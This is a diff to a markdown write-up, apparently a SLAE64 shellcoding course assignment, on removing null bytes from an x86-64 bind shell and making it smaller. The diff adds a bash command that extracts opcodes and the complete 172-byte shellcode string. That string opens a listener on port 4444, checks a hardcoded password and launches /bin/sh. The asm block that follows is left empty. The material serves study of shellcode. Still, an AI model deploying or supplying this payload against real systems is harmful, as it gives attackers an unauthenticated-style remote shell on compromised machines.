@@ -321,9 +321,21 @@ Desensamblado de la sección .text:
 - `mov [rsp], VALUE` is replaced by `push VALUE`
 - Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
 
-Let's replace all instructions until no NULLs are shown by `objdump` in the shellcode.
+Let's replace all instructions until no NULLs are shown by `objdump` in the shellcode. Being carefull on which instructions are used, the size of the shellcode just removing the NULLs, is reduced to 172 bytes. 
 
-Also, the original code is using Relative Addressing for the Password Stuff. This is using bytes for the strings (as they are in the code section of the program), and the `lea` instruction has a opcode that uses 7 bytes. Also let's use the Stack for the Password Stuff.
+To get the final shellcode the following `bash` command is used:
+```bash
+SLAE64> echo “\"$(objdump -d 0_BindShell-ExecveStack.o | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\"""
+
+**"\xeb\x10\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x41\x41\x41\x41\x41\x41\x41\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x50\x5b\x6a\x03\x58\x0f\x05\x53\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x50\x5f\x48\x8d\x35\x95\xff\xff\xff\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x50\x5f\x48\x83\xc6\x08\x6a\x08\x5a\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58\x0f\x05"**
+```
+
+But still the shellcode size can be reduced: the original code is using Relative Addressing for the Password Stuff. This is using bytes for the strings (as they are in the code section of the program), and the `lea` instruction has a opcode that uses 7 bytes. For this the Stack Technique is being used for the Password Stuff instead Relative Addressing. The new code for the Password Stuff section after appliying changes is:
+```asm
+
+```
+
+
 
 
 
